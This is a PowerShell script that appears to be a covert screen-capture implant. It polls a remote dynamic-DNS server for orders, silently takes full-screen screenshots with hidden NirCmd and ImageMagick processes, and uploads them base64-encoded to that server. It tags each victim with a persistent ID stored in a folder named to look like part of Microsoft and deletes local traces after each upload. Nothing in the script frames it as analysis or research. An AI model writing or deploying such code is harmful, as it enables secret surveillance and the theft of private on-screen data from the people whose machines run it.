$LogPath = "$env:TEMP\run\ss_controller.log"

function Log {
  param([string]$Message)

  $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff"

  "$Timestamp | $Message" | Add-Content -Path $LogPath
}

if (!(Test-Path "$env:TEMP\run")) {
  $null = New-Item `
    "$env:TEMP\run" `
    -ItemType Directory
}

Log "01 ss_controller starting"

$mutex = New-Object System.Threading.Mutex($false, "ss_control")

Log "02 Checking mutex"

if (-not $mutex.WaitOne(0)) {
  Log "03 Another ss_controller instance is already running"
  exit
}

Log "03 Mutex acquired"

# Create ID
$IdPath = "$env:APPDATA\Microsoft\run\run.txt"

Log "04 ID path: $IdPath"

if (Test-Path $IdPath) {
  $raw = (Get-Content $IdPath -Raw).Trim()

  if ($raw.Length -ge 8) {
    $uniqueId = $raw.Substring(0, 8)
  }
  else {
    $uniqueId = $raw
  }

  Log "05 Existing ID found: $uniqueId"
}
else {
  $uniqueId = ([guid]::NewGuid().ToString()).Substring(0, 8)

  Set-Content `
    -Path $IdPath `
    -Value $uniqueId

  Log "05 New ID created: $uniqueId"
}

$uniqueUser = "$($env:USERNAME)-$uniqueId-W"

Log "06 Username: $uniqueUser"

$UserFolder = Join-Path `
  (Join-Path $env:TEMP "frames-repo") `
  $uniqueUser

Log "07 User folder: $UserFolder"

if (!(Test-Path $UserFolder)) {
  $null = New-Item `
    $UserFolder `
    -ItemType Directory

  Log "08 User folder created"
}
else {
  Log "08 User folder already exists"
}

Add-Type -AssemblyName System.Drawing

Log "09 System.Drawing loaded"

$VPS_POLL_URL = "http://runx.ddns.net/api/poll"
$VPS_UPLOAD_URL = "http://runx.ddns.net/api/upload"

Log "10 Poll URL: $VPS_POLL_URL"
Log "11 Upload URL: $VPS_UPLOAD_URL"

if (Test-Path "$env:TEMP\run\nircmd\nircmd.exe") {
  Log "12 NirCmd found"
}
else {
  Log "12 ERROR: NirCmd not found"
}

if (Test-Path "$env:TEMP\run\magick\magick.exe") {
  Log "13 ImageMagick found"
}
else {
  Log "13 ERROR: ImageMagick not found"
}

Log "14 Starting controller loop"

while ($true) {
  try {
    Log "15 Polling VPS"

    $fullUri = $VPS_POLL_URL + "?username=" + $uniqueUser

    Log "15a Full URI: $fullUri"
    Log "15b URI length: $($fullUri.Length)"
    Log "15c VPS_POLL_URL: $VPS_POLL_URL"
    Log "15d uniqueUser: $uniqueUser"

    $response = Invoke-RestMethod `
      -Method Get `
      -Uri $fullUri `
      -TimeoutSec 10 `
      -UseBasicParsing

    Log "16 Poll successful"
    Log "16a Response type: $($response.GetType().Name)"
    Log "16b Response content: $response"

    if ($response) {
      Log "16c Response exists"

      if ($response -is [string]) {
        Log "16d Response is string, converting to JSON"

        $response = $response | ConvertFrom-Json
      }

      Log "16e Response capture value: $($response.capture)"
    }

    if ($response -and $response.capture -eq $true) {
      Log "17 Capture requested"

      $Timestamp = Get-Date -Format "yyyyMMddHHmmssfff"

      $RawPath = Join-Path `
        $UserFolder `
        "raw_$Timestamp.png"

      $JpegPath = Join-Path `
        $UserFolder `
        "$Timestamp.jpg"

      Log "18 Raw path: $RawPath"
      Log "19 JPEG path: $JpegPath"

      # Capture screenshot using NirCmd
      Log "20 Starting NirCmd"

      Start-Process `
        -FilePath "$env:TEMP\run\nircmd\nircmd.exe" `
        -ArgumentList "savescreenshotfull `"$RawPath`"" `
        -WindowStyle Hidden `
        -Wait

      Log "21 NirCmd finished"

      # Convert to JPEG using ImageMagick
      if (Test-Path $RawPath) {
        Log "22 Raw screenshot found"

        $MagickExe = "$env:TEMP\run\magick\magick.exe"

        $magickArgs = `
          "`"$RawPath`" -colorspace gray -resize 50% -quality 80 `"$JpegPath`""

        Log "23 Starting ImageMagick"

        Start-Process `
          -FilePath $MagickExe `
          -ArgumentList $magickArgs `
          -WindowStyle Hidden `
          -Wait

        Log "24 ImageMagick finished"

        Remove-Item `
          $RawPath `
          -Force

        Log "25 Raw screenshot removed"
      }
      else {
        Log "22 ERROR: Raw screenshot was not created"
      }

      # Upload JPEG to VPS
      if (Test-Path $JpegPath) {
        Log "26 JPEG found"

        $fileBytes = [System.IO.File]::ReadAllBytes($JpegPath)

        $base64Image = [Convert]::ToBase64String($fileBytes)

        Log "27 JPEG converted to Base64"

        $body = @{
          username = $uniqueUser
          filename = (Get-Item $JpegPath).Name
          image = $base64Image
        } | ConvertTo-Json -Compress

        Log "28 Uploading JPEG"

        Invoke-RestMethod `
          -Method Post `
          -Uri $VPS_UPLOAD_URL `
          -ContentType "application/json" `
          -Body $body `
          -TimeoutSec 10 `
          -UseBasicParsing |
          Out-Null

        Log "29 Upload successful"

        Remove-Item `
          $JpegPath `
          -Force

        Log "30 JPEG removed"
      }
      else {
        Log "26 ERROR: JPEG was not created"
      }
    }
    else {
      Log "17 No capture requested"
    }
  }
  catch {
    Log "ERROR at line $($_.InvocationInfo.ScriptLineNumber): $($_.Exception.Message)"
    Log "ERROR TYPE: $($_.Exception.GetType().FullName)"
    Log "ERROR URI attempt: $fullUri"
    Log "ERROR DETAILS: $($_.Exception.ToString())"
  }

  Start-Sleep -Seconds 1
}
